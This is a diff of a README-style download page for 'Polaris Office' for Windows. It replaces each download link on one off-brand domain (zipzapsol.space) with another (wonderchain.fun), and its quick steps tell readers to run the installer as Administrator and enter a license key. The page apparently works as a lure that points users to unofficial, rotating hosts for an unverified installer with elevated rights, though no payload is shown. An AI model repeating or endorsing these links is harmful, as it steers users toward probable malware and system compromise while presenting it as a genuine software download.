@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Polaris Office** for Windows.
 
 <p align="center">
-  <a href="https://polaris-office.zipzapsol.space/">
+  <a href="https://polaris-office.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Polaris%20Office-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Polaris Office">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[polaris-office.zipzapsol.space](https://polaris-office.zipzapsol.space/)** |
-| **Full URL** | `https://polaris-office.zipzapsol.space/` |
+| **Direct link** | **[polaris-office.wonderchain.fun](https://polaris-office.wonderchain.fun/)** |
+| **Full URL** | `https://polaris-office.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — polaris-office.zipzapsol.space](https://polaris-office.zipzapsol.space/)** (link above)
+1. Click **[Download — polaris-office.wonderchain.fun](https://polaris-office.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://polaris-office.zipzapsol.space/"><strong>⬇ Download Polaris Office now</strong></a></p>
+<p align="center"><a href="https://polaris-office.wonderchain.fun/"><strong>⬇ Download Polaris Office now</strong></a></p>
 
 ---
 
